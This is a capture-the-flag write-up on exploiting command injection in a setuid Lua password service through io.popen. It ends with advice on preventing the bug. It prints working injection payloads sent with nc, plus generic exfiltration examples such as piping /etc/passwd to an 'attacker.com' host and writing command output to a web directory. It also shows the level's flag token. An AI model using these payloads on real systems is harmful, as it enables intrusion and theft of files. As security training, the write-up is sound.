# Level 11 - Lua Script Command Injection

## 🎯 Objective
Exploit a Lua network service to execute commands as `flag11`.

## 🧠 My Thought Process

### Step 1: "A Lua script running a server"
```bash
cat level11.lua
```

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")  -- VULNERABLE!
  data = prog:read("*all")
  prog:close()
  data = string.sub(data, 1, 40)
  return data
end

while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)
      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end
  end
  client:close()
end
```

### Step 2: "Spotting the vulnerability"
The dangerous line:
```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

**What happens:**
1. User input (`pass`) comes from the network
2. It's concatenated directly into a shell command
3. `io.popen()` executes the command in a shell
4. No sanitization or escaping!

### Step 3: "Understanding io.popen()"
`io.popen()` in Lua is similar to `popen()` in C or `os.popen()` in Python:
- Starts a shell (`/bin/sh -c "..."`)
- Runs the given command
- Returns a file handle for reading output

**Shell metacharacters in input will be interpreted!**

### Step 4: "Crafting the injection"
If I send the password as: `$(getflag)`

The command becomes:
```bash
echo $(getflag) | sha1sum
```

The shell will:
1. Execute `getflag` via command substitution
2. Output gets passed to `sha1sum`
3. But we don't see the output directly...

**Better approach:** Redirect output to a file:
```bash
echo $(getflag > /tmp/flag11) | sha1sum
```

### Step 5: "Sending the payload"
```bash
echo '$(getflag > /tmp/flag11)' | nc 127.0.0.1 5151
```

Or I can use bash's command substitution more directly:
```bash
echo '`getflag > /tmp/flag11`' | nc 127.0.0.1 5151
```

### Step 6: "Retrieve the flag"
```bash
cat /tmp/flag11
# Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

## ✅ Solution
```bash
# Send the command injection payload
echo '$(getflag > /tmp/flag11)' | nc 127.0.0.1 5151

# Read the captured flag
cat /tmp/flag11
```

**Token:** `fa6v5ateaw21peobuub8ipe6s`

## 📚 Concepts to Learn

### 1. Lua io.popen() Function
```lua
io.popen(command, mode)
```

- Executes `command` in a shell
- Returns file handle for reading (`"r"`) or writing (`"w"`)
- **Dangerous with user input!**

Equivalent functions in other languages:
| Language | Function |
|----------|----------|
| Lua | io.popen() |
| Python | os.popen(), subprocess.Popen(shell=True) |
| C | popen() |
| PHP | popen(), shell_exec() |
| Ruby | IO.popen() |

### 2. String Concatenation Injection
```lua
-- DANGEROUS
command = "echo " .. user_input .. " | sha1sum"
io.popen(command)

-- User input: "hello"
-- Result: echo hello | sha1sum (OK)

-- User input: "$(id)"
-- Result: echo $(id) | sha1sum (COMMAND INJECTION!)
```

### 3. Shell Command Substitution
Two syntaxes, same result:

```bash
# Modern syntax
echo $(whoami)

# Legacy syntax (backticks)
echo `whoami`

# Both execute the inner command and substitute output
```

### 4. Output Redirection Strategy
When you can inject commands but can't see output:

```bash
# Redirect to a file
$(cat /etc/passwd > /tmp/output)

# Send over network
$(cat /etc/passwd | nc attacker.com 4444)

# Write to accessible web directory
$(id > /var/www/html/output.txt)
```

### 5. The Attack Flow
```
┌──────────────────────────────────────────────────────────┐
│  Attacker                          Server (level11.lua) │
│                                                          │
│  1. nc 127.0.0.1 5151              ← Listening on 5151  │
│                                                          │
│  2. "Password: "                   →  (prompt sent)     │
│                                                          │
│  3. "$(getflag > /tmp/f)"          →  (payload sent)    │
│                                                          │
│  4.                                   io.popen() runs:  │
│                                       echo $(getflag    │
│                                       > /tmp/f) | sha1  │
│                                                          │
│  5.                                   getflag executes! │
│                                       Output → /tmp/f   │
│                                                          │
│  6. cat /tmp/f                     →  Read the token    │
└──────────────────────────────────────────────────────────┘
```

### 6. Why the Server Runs as flag11
The script `level11.lua` has setuid permissions:
- `-rwsr-sr-x 1 flag11 level11`
- When it executes `io.popen()`, commands run as flag11
- `getflag` therefore returns flag11's token

## 🔧 Tools Used
- `nc` (netcat) - Connect to the service
- `echo` - Send payload through pipe
- `cat` - Read captured output
- Understanding of Lua and shell

## 🛡️ How to Prevent This
1. **Never concatenate user input into commands:**
   ```lua
   -- WRONG
   io.popen("echo " .. input)
   
   -- RIGHT - Don't use shell at all
   -- Use crypto library directly for SHA1
   local sha1 = require("sha1")
   local hash = sha1(input)
   ```

2. **Input validation:**
   ```lua
   -- Only allow alphanumeric
   if not input:match("^[%w]+$") then
       error("Invalid input")
   end
   ```

3. **Shell escaping (if you must use shell):**
   ```lua
   -- Escape shell metacharacters
   local function shell_escape(s)
       return "'" .. s:gsub("'", "'\\''") .. "'"
   end
   io.popen("echo " .. shell_escape(input))
   ```

4. **Use libraries instead of shell:**
   ```lua
   -- Instead of: io.popen("sha1sum")
   -- Use a native Lua SHA1 library
   local sha1 = require("sha1")
   ```

5. **Run services with minimal privileges:**
   - Don't use setuid on network services
   - Use dedicated service accounts
   - Implement proper sandboxing

